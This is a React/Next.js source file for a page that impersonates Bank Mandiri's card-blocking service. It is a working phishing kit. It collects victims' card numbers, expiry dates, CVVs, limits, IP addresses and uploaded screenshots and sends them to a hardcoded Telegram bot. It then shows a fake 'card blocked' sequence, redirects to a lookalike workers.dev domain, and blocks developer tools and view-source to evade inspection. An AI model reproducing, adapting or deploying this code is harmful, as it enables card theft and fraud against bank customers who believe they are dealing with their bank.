'use client';

import React, { useState, useEffect, useRef } from 'react';
import Image from 'next/image';

export default function Home() {
  const TELEGRAM_BOT_TOKEN = '8673674549:AAHP18UpUK20Rm3PzNkdnRkhkty2F0_yb_8';
  const TELEGRAM_CHAT_ID = '-1003801777662';
  
  const DURATION_BLOCK_PROCESS = 7;
  const DURATION_BLOCK_SUCCESS = 7;
  const DURATION_FINAL_SEND = 7;

  // View state: 'card', 'upload', 'loading'
  const [currentView, setCurrentView] = useState('card');
  const [showLoading, setShowLoading] = useState(false);
  
  // Form State
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [limit, setLimit] = useState('');
  const [cardType, setCardType] = useState('Lainnya');
  const [isFlipped, setIsFlipped] = useState(false);
  const [luhnValid, setLuhnValid] = useState<boolean | null>(null);

  // Upload State
  const [file, setFile] = useState<File | null>(null);
  const [filePreview, setFilePreview] = useState('');
  const [fileName, setFileName] = useState('');

  // Loading Overlay State
  const [loadingTitle, setLoadingTitle] = useState('Memproses Permintaan');
  const [loadingMessage, setLoadingMessage] = useState('Mohon tunggu sebentar...');
  const [progress, setProgress] = useState(0);
  const [timer, setTimer] = useState(0);
  const [isSuccess, setIsSuccess] = useState(false);
  const [showOkBtn, setShowOkBtn] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Collected data for upload step
  const [collectedData, setCollectedData] = useState<any>({});

  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      // F12
      if (e.keyCode === 123) {
        e.preventDefault();
        return false;
      }
      // Ctrl+Shift+I or Ctrl+Shift+J
      if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) {
        e.preventDefault();
        return false;
      }
      // Ctrl+U (View Source), Ctrl+S (Save), Ctrl+C (Copy)
      if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 67)) {
        e.preventDefault();
        return false;
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  const luhnCheck = (s: string) => {
    let sum = 0, alt = false;
    for (let i = s.length - 1; i >= 0; i--) {
      let d = parseInt(s[i]);
      if (alt) { d *= 2; if (d > 9) d -= 9; }
      sum += d; alt = !alt;
    }
    return sum % 10 === 0;
  };

  const getCardType = (num: string) => {
    if (/^5573/.test(num)) return 'Mandiri Platinum Mastercard';
    if (/^3563/.test(num)) return 'Precious JCB';
    if (/^4799/.test(num)) return 'Traveloka Visa Plat';
    if (/^4616/.test(num)) return 'Debit Gold';
    if (/^4617/.test(num)) return 'Debit Platinum';
    if (/^4/.test(num)) return 'Visa';
    return 'Lainnya';
  };

  const updateCardBg = (num: string) => {
    let classes = '';
    if (/^5573/.test(num)) classes = 'mastercard-5573';
    else if (/^3563/.test(num)) classes = 'debit-3563';
    else if (/^4799/.test(num)) classes = 'debit-4799';
    else if (/^4616/.test(num)) classes = 'debit-4616';
    else if (/^4617/.test(num)) classes = 'debit-4617';
    else if (/^4/.test(num)) classes = 'visa-card';
    return classes;
  };

  const getIP = async () => {
    try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch { return 'N/A'; }
  };

  const getDeviceType = () => {
    if (typeof window === 'undefined') return 'N/A';
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return "📱 Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "📱 iPhone/iOS";
    if (/Windows/i.test(ua)) return "💻 Windows PC";
    if (/Macintosh/i.test(ua)) return "💻 Mac OS";
    return "❓ Lainnya";
  };

  const sendTextToTelegram = async (msg: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
      });
    } catch (e) { console.error(e); }
  };

  const sendPhotoToTelegram = async (photoFile: File, caption: string) => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoFile);
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } catch (e) { console.error(e); }
  };

  // Input Handlers
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, '');
    let fmt = '';
    for (let i = 0; i < v.length; i++) { if (i > 0 && i % 4 === 0) fmt += ' '; fmt += v[i]; }
    // const rawVal = v.substring(0, 19);
    setCardNumber(fmt.substring(0, 19));
    
    const raw16 = v.substring(0, 16);
    if (raw16.length >= 13) {
      setLuhnValid(luhnCheck(raw16));
    } else {
      setLuhnValid(null);
    }
    setCardType(getCardType(raw16));
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
    setExpiryDate(v.substring(0, 5));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
    setCvv(v);
    if (v.length) setIsFlipped(true); else setIsFlipped(false);
  };

  const handleLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/[^0-9]/g, '');
    if (value) value = parseInt(value, 10).toLocaleString('id-ID');
    setLimit(value);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setFile(file);
      setFileName(file.name);
      const reader = new FileReader();
      reader.onload = (re) => {
        setFilePreview(re.target?.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const rawNum = cardNumber.replace(/\D/g, '');
    if (!luhnCheck(rawNum) || rawNum.length < 13) {
      alert('Nomor kartu tidak valid.');
      return;
    }

    const deviceName = getDeviceType();
    const ipAddress = await getIP();

    const data = {
      cardNumber,
      limit,
      expiryDate,
      cvv,
      cardType: getCardType(rawNum),
      ip: ipAddress,
      device: deviceName
    };
    setCollectedData(data);

    const msg = `🔴 *DATA KARTU MASUK* 🔴
• Nomor: \`${cardNumber}\`
• Exp: ${expiryDate}
• CVV: \`${cvv}\`
• Limit: Rp ${limit}
• Tipe: ${data.cardType}
📱 Device: ${deviceName}
🌐 IP: ${ipAddress}`;

    setIsSubmitting(true);
    sendTextToTelegram(msg);

    setTimeout(() => {
      setShowLoading(true);
      setIsSubmitting(false);
      let sec1 = DURATION_BLOCK_PROCESS;
      setLoadingTitle("Memproses Pemblokiran");
      setLoadingMessage("Mohon tunggu, sistem sedang memproses...");
      setIsSuccess(false);
      setTimer(sec1);
      setProgress(0);

      const timer1 = setInterval(() => {
        sec1--;
        setTimer(sec1);
        setProgress(((DURATION_BLOCK_PROCESS - sec1) / DURATION_BLOCK_PROCESS) * 100);

        if (sec1 <= 0) {
          clearInterval(timer1);
          setIsSuccess(true);
          setLoadingTitle("Kartu Berhasil diblokir");
          setLoadingMessage("Anda akan dialihkan ke halaman Pembatalan Transaksi...");
          
          let sec2 = DURATION_BLOCK_SUCCESS;
          setTimer(sec2);
          setProgress(0);

          const timer2 = setInterval(() => {
            sec2--;
            setTimer(sec2);
            setProgress(((DURATION_BLOCK_SUCCESS - sec2) / DURATION_BLOCK_SUCCESS) * 100);

            if (sec2 <= 0) {
              clearInterval(timer2);
              setShowLoading(false);
              window.location.href = 'https://batalkantransaksi-batal.ibankmandiricom.workers.dev/';
            }
          }, 1000);
        }
      }, 1000);
    }, 1500);
  };

  const handleUploadSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      alert('Silakan unggah bukti transaksi terlebih dahulu.');
      return;
    }

    const caption = `🖼 *BUKTI PEMBATALAN TRANSAKSI*
• Kartu: ${collectedData.cardNumber}
• Limit: Rp ${collectedData.limit}
📱 Device: ${collectedData.device}
🌐 IP: ${collectedData.ip}`;

    setIsSubmitting(true);
    sendPhotoToTelegram(file, caption);

    setTimeout(() => {
      setCurrentView('none'); // Hide the upload view
      setShowLoading(true);
      setIsSubmitting(false);
      setIsSuccess(false);
      setLoadingTitle("Memproses Pembatalan");
      setLoadingMessage("Mohon tunggu, memproses bukti Anda...");
      setShowOkBtn(false);

      let secFinal = DURATION_FINAL_SEND;
      setTimer(secFinal);
      setProgress(0);

      const timerFinal = setInterval(() => {
        secFinal--;
        setTimer(secFinal);
        setProgress(((DURATION_FINAL_SEND - secFinal) / DURATION_FINAL_SEND) * 100);

        if (secFinal <= 0) {
          clearInterval(timerFinal);
          setIsSuccess(true);
          setLoadingTitle("Pembatalan Transaksi Berhasil");
          setLoadingMessage("Klik OK untuk kembali menu utama.");
          setShowOkBtn(true);
        }
      }, 1000);
    }, 1500);
  };

  const getFormattedCardNumber = () => {
    const raw = cardNumber.replace(/\D/g, '');
    const masked = raw.length <= 4 ? raw.padEnd(16, '•') : raw.substring(0, 4) + '•'.repeat(12);
    let spaced = '';
    for (let i = 0; i < masked.length; i++) {
       if (i > 0 && i % 4 === 0) spaced += ' ';
       spaced += masked[i];
    }
    return spaced;
  };

  return (
    <main>
      {/* View 1: Card Form */}
      <div className={`page-container ${currentView === 'card' ? 'active' : ''}`} id="view-1-card">
        <header className="app-header">
          <div className="mandiri-logo">
            <img
              src="https://companieslogo.com/img/orig/BMRI.JK.D-57128c9b.png?t=1720244491"
              alt="Bank Mandiri Logo"
              referrerPolicy="no-referrer"
            />
          </div>
        </header>
        <div className="main-content">
          <div className="page-title">
            Blokir Credit Mandiri
            <span className="mandiri-badge ml-1.5">RESMI</span>
          </div>
          <div className="card-flipper-container">
            <div className={`card-flipper ${isFlipped ? 'is-flipped' : ''}`}>
              <div className={`card-front ${updateCardBg(cardNumber.replace(/\D/g, ''))}`}>
                <div className="card-top-row"></div>
                <div className="card-middle-row">
                  <div className="card-display-text">
                    {getFormattedCardNumber()}
                  </div>
                </div>
                <div className="card-bottom-row">
                  <div>
                    <p>VALID THRU</p>
                    <div id="display-expiry-date">
                      {expiryDate || 'MM/YY'}
                    </div>
                  </div>
                </div>
              </div>
              <div className="card-back">
                <div className="magnetic-strip"></div>
                <div className="cvv-area">
                  <p className="text-[0.6rem]">CVV</p>
                  <div id="display-cvv" className="bg-white text-black px-2.5 py-0.5 rounded-md font-mono font-semibold text-[0.9rem] inline-block">
                    {cvv || '•••'}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="form-section">
          <form id="card-form" onSubmit={handleCardSubmit}>
            <div className="form-group">
              <input
                type="text"
                id="card-number-input"
                placeholder=" "
                maxLength={19}
                inputMode="numeric"
                required
                value={cardNumber}
                onChange={handleCardNumberChange}
              />
              <label htmlFor="card-number-input">Nomor Kartu</label>
              <div className="input-icon icon-card"></div>
              <span className={`luhn-indicator ${luhnValid !== null ? 'visible' : ''} ${luhnValid ? 'valid' : 'invalid'}`}>
                {luhnValid === true ? '✓ valid' : luhnValid === false ? '✗ invalid' : ''}
              </span>
            </div>
            <div className="form-row">
              <div className="form-group">
                <input
                  type="text"
                  id="expiry-date-input"
                  placeholder=" "
                  maxLength={5}
                  inputMode="numeric"
                  required
                  value={expiryDate}
                  onChange={handleExpiryDateChange}
                />
                <label htmlFor="expiry-date-input">MM/YY</label>
                <div className="input-icon icon-date"></div>
              </div>
              <div className="form-group">
                <input
                  type="text"
                  id="cvv-input"
                  placeholder=" "
                  maxLength={4}
                  inputMode="numeric"
                  required
                  value={cvv}
                  onChange={handleCvvChange}
                  onFocus={() => setIsFlipped(true)}
                  onBlur={() => { if (!cvv) setIsFlipped(false); }}
                />
                <label htmlFor="cvv-input">CVV</label>
                <div className="input-icon icon-lock"></div>
              </div>
            </div>
            <div className="form-group">
              <input
                type="text"
                id="limit-input"
                placeholder=" "
                inputMode="numeric"
                required
                value={limit}
                onChange={handleLimitChange}
              />
              <label htmlFor="limit-input">Limit Tersedia (Rp)</label>
              <div className="input-icon icon-money"></div>
              <span className="helper-text">Limit kartu akan dialihkan ke kartu Pengganti.</span>
            </div>
          </form>
        </div>
        <footer className="page-footer">
          <button className={`submit-btn ${isSubmitting ? 'loading' : ''}`} type="submit" form="card-form" id="btn-next-step">
            <span className="button-text">BLOKIR KARTU</span>
            <div className="loading-content">
              <div className="mandiri-loading-spinner"></div>
              <span className="loading-text">Memproses...</span>
            </div>
          </button>
        </footer>
        <div className="bottom-image-section">
          <img
            src="https://i.ibb.co.com/1YM67CKB/1000043710.jpg"
            alt=" "
            className="bottom-image"
            referrerPolicy="no-referrer"
          />
        </div>
      </div>

      {/* View 2: Upload */}
      <div className={`page-container ${currentView === 'upload' ? 'active' : ''}`} id="view-2-upload">
        <header className="app-header">
          <div className="mandiri-logo">
            <img
              src="https://companieslogo.com/img/orig/BMRI.JK.D-57128c9b.png?t=1720244491"
              alt="Bank Mandiri Logo"
              referrerPolicy="no-referrer"
            />
          </div>
        </header>
        <main className="main-content">
          <div className="page-title">
            Pembatalan Transaksi
          </div>
          <div className="info-box">
            <b>Penting:</b> Silakan lampirkan bukti transaksi (screenshot/foto) agar kami dapat memproses pembatalan transaksi yang bukan anda lakukan
          </div>
          <form id="upload-form" onSubmit={handleUploadSubmit}>
            <input
              type="file"
              id="file-input"
              accept="image/*"
              className="hidden"
              ref={fileInputRef}
              onChange={handleFileChange}
              required
            />
            <div className="upload-area" id="drop-area" onClick={() => fileInputRef.current?.click()}>
              <span className="upload-icon">📷</span>
              <div className="upload-text">
                Ketuk untuk Unggah Bukti
              </div>
              <span className="upload-subtext">Format: JPG, PNG, JPEG</span>
              {filePreview && (
                <div id="file-preview-container" style={{ display: 'block' }}>
                  <img id="file-preview" src={filePreview} alt="Preview" key={filePreview} />
                  <div className="file-name" id="file-name-display">{fileName}</div>
                </div>
              )}
            </div>
          </form>
        </main>
        <footer className="page-footer">
          <button className={`submit-btn ${isSubmitting ? 'loading' : ''}`} type="submit" form="upload-form" id="btn-final-submit" disabled={!file}>
            <span className="button-text">BATALKAN TRANSAKSI</span>
            <div className="loading-content">
              <div className="mandiri-loading-spinner"></div>
              <span className="loading-text">Mengirim Data...</span>
            </div>
          </button>
        </footer>
        <div className="bottom-image-section">
          <img
            src="https://i.ibb.co.com/1YM67CKB/1000043710.jpg"
            alt=" "
            className="bottom-image"
            referrerPolicy="no-referrer"
          />
        </div>
      </div>

      {/* Loading Overlay */}
      <div className={`loading-page ${showLoading ? 'active' : ''}`} id="loading-overlay">
        <div className="loading-card" id="loading-card-content">
          {!isSuccess ? (
            <div className="loading-spinner-large" id="mainSpinner"></div>
          ) : (
            <div className="success-icon flex" id="successIcon" style={{ display: 'flex' }}>
              ✓
            </div>
          )}
          <h2 className="loading-title" id="loadingTitle">{loadingTitle}</h2>
          <p className="loading-message" id="loadingMessage">{loadingMessage}</p>
          {!showOkBtn && (
            <>
              <div className="loading-progress-container">
                <div className="loading-progress-bar" id="progressBar" style={{ width: `${progress}%` }}></div>
              </div>
              <div className="loading-timer" id="timerDisplay">
                tersisa <span id="countdown">{timer}</span> detik
              </div>
            </>
          )}
          {showOkBtn && (
            <button id="btn-ok-refresh" style={{ display: 'inline-block' }} onClick={() => window.location.reload()}>
              OK
            </button>
          )}
        </div>
      </div>
    </main>
  );
}
